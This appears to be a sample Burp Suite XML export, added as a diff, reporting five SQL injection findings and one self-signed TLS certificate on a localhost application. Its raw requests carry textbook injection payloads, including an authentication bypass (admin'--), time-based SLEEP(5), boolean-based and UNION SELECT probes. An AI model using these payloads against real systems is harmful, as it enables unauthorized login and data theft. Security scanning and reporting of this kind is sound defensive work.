@@ -1,0 +1,201 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<issues burpVersion="2026.3.3" exportTime="Fri Jun 05 12:00:00 BST 2026">
+  <issue>
+    <serialNumber>8589626428108778497</serialNumber>
+    <type>16777216</type>
+    <name>SQL injection</name>
+    <host ip="192.168.1.100">http://localhost:8080</host>
+    <path>/search</path>
+    <location>/search?query=[parameter: query]</location>
+    <severity>High</severity>
+    <confidence>Certain</confidence>
+    <issueBackground>
+      <p>SQL injection vulnerabilities allow an attacker to interfere with database queries. This may allow an attacker to view, modify, or delete data.</p>
+    </issueBackground>
+    <issueDetail>
+      <p>The application appears to be vulnerable to SQL injection. Testing with payloads like ' OR '1'='1 resulted in altered application behavior.</p>
+    </issueDetail>
+    <request base64="false">GET /search?query=test' OR '1'='1 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Cookie: PHPSESSID=abc123def456
+Connection: close
+
+</request>
+    <response base64="false">HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 5432
+Connection: close
+
+&lt;html&gt;
+&lt;body&gt;
+&lt;h1&gt;Search Results&lt;/h1&gt;
+&lt;p&gt;You searched for: test' OR '1'='1&lt;/p&gt;
+&lt;table&gt;
+&lt;tr&gt;&lt;td&gt;ID&lt;/td&gt;&lt;td&gt;Name&lt;/td&gt;&lt;td&gt;Email&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;Admin&lt;/td&gt;&lt;td&gt;admin@example.com&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;User&lt;/td&gt;&lt;td&gt;user@example.com&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;Guest&lt;/td&gt;&lt;td&gt;guest@example.com&lt;/td&gt;&lt;/tr&gt;
+&lt;/table&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</response>
+  </issue>
+  <issue>
+    <serialNumber>8589626428108778498</serialNumber>
+    <type>16777216</type>
+    <name>SQL injection</name>
+    <host ip="192.168.1.100">http://localhost:8080</host>
+    <path>/login</path>
+    <location>/login[parameter: username]</location>
+    <severity>Critical</severity>
+    <confidence>Certain</confidence>
+    <issueBackground>
+      <p>SQL injection in authentication forms can lead to unauthorized access to the application and sensitive data.</p>
+    </issueBackground>
+    <issueDetail>
+      <p>The login form is vulnerable to SQL injection in the username parameter. Testing with admin' -- resulted in bypassing authentication.</p>
+    </issueDetail>
+    <request base64="false">POST /login HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 47
+Connection: close
+
+username=admin'--&amp;password=anything&amp;submit=Login
+</request>
+    <response base64="false">HTTP/1.1 302 Found
+Location: /admin
+Set-Cookie: session_token=eyJhZG1pbiI6dHJ1ZX0
+Connection: close
+
+</response>
+  </issue>
+  <issue>
+    <serialNumber>8589626428108778499</serialNumber>
+    <type>16777216</type>
+    <name>SQL injection</name>
+    <host ip="192.168.1.100">http://localhost:8080</host>
+    <path>/products</path>
+    <location>/products?category=[parameter: category]</location>
+    <severity>High</severity>
+    <confidence>Firm</confidence>
+    <issueBackground>
+      <p>SQL injection allows attackers to manipulate database queries and potentially extract sensitive information.</p>
+    </issueBackground>
+    <issueDetail>
+      <p>The category parameter is vulnerable to time-based blind SQL injection. Responses are delayed when SLEEP() is injected.</p>
+    </issueDetail>
+    <request base64="false">GET /products?category=electronics' AND SLEEP(5)-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0
+Accept: text/html
+Connection: close
+
+</request>
+    <response base64="false">HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 2145
+Connection: close
+
+&lt;html&gt;
+&lt;body&gt;
+&lt;h1&gt;Product Search&lt;/h1&gt;
+&lt;p&gt;Loading results...&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</response>
+  </issue>
+  <issue>
+    <serialNumber>8589626428108778500</serialNumber>
+    <type>16777216</type>
+    <name>SQL injection</name>
+    <host ip="192.168.1.100">http://localhost:8080</host>
+    <path>/api/users</path>
+    <location>/api/users?id=[parameter: id]</location>
+    <severity>High</severity>
+    <confidence>Tentative</confidence>
+    <issueBackground>
+      <p>SQL injection in API endpoints can expose user data and allow database manipulation.</p>
+    </issueBackground>
+    <issueDetail>
+      <p>The id parameter appears to be vulnerable to boolean-based blind SQL injection. Response differences indicate query manipulation.</p>
+    </issueDetail>
+    <request base64="false">GET /api/users?id=1' AND '1'='1 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0
+Accept: application/json
+Authorization: Bearer token123
+Connection: close
+
+</request>
+    <response base64="false">HTTP/1.1 200 OK
+Content-Type: application/json
+Content-Length: 156
+Connection: close
+
+{
+  "users": [
+    {"id": 1, "name": "Alice", "role": "admin"},
+    {"id": 2, "name": "Bob", "role": "user"},
+    {"id": 3, "name": "Charlie", "role": "user"}
+  ],
+  "total": 3
+}
+</response>
+  </issue>
+  <issue>
+    <serialNumber>8589626428108778501</serialNumber>
+    <type>16777216</type>
+    <name>SQL injection</name>
+    <host ip="192.168.1.100">http://localhost:8080</host>
+    <path>/report</path>
+    <location>/report?filter=[parameter: filter]</location>
+    <severity>Medium</severity>
+    <confidence>Firm</confidence>
+    <issueBackground>
+      <p>SQL injection vulnerabilities in reporting features can lead to data exfiltration.</p>
+    </issueBackground>
+    <issueDetail>
+      <p>The filter parameter in the report functionality is susceptible to error-based SQL injection, leaking database information.</p>
+    </issueDetail>
+    <request base64="false">GET /report?filter=status' UNION SELECT database(),user(),version()-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0
+Accept: text/html
+Cookie: admin_session=xyz789
+Connection: close
+
+</request>
+    <response base64="false">HTTP/1.1 500 Internal Server Error
+Content-Type: text/html
+Content-Length: 892
+Connection: close
+
+&lt;html&gt;
+&lt;body&gt;
+&lt;h1&gt;Error&lt;/h1&gt;
+&lt;p&gt;SQL Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT database()' at line 1&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</response>
+  </issue>
+  <issue>
+    <serialNumber>8589626428108778502</serialNumber>
+    <type>16777472</type>
+    <name>TLS certificate issue</name>
+    <host ip="192.168.1.100">https://localhost:8443</host>
+    <path>/</path>
+    <location>/</location>
+    <severity>Information</severity>
+    <confidence>Certain</confidence>
+    <issueBackground>
+      <p>TLS certificate validation issue.</p>
+    </issueBackground>
+    <issueDetail>
+      <p>Self-signed certificate detected.</p>
+    </issueDetail>
+  </issue>
+</issues>
